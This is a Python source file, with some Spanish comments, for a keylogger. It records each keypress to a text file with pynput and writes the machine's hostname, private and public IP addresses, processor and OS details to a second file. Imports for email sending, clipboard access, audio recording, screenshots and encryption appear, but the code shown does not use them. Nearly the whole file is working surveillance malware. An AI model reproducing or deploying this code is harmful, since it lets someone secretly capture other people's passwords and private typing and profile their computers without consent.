# libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time 
import os

from scipy.io.wavfile import write 
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfo.txt"

file_path = "C:\\Users\\Win 10\\Documents\\Keylogger" #cambiar ruta si no funciona 
extend = "\\"

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        
        except Exception:
            f.write("No es posible obtener la IP address (most likely max query")
        
        f.write("Procesador: " + (platform.processor()) + '\n')
        f.write ("Sistema: " + (platform.system()) + " " + platform.version() + '\n')
        f.write ("Equipo: " + platform.machine() + "\n")
        f.write ("Hostname: " + hostname + "\n")
        f.write ("Private IP address: " + IPAddr + "\n")

computer_information()

count = 0
keys = []

def on_press(key) : 
    global keys, count 

    print(key)
    keys.append(key)
    count += 1

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0: 
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write (k)
                f.close ()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
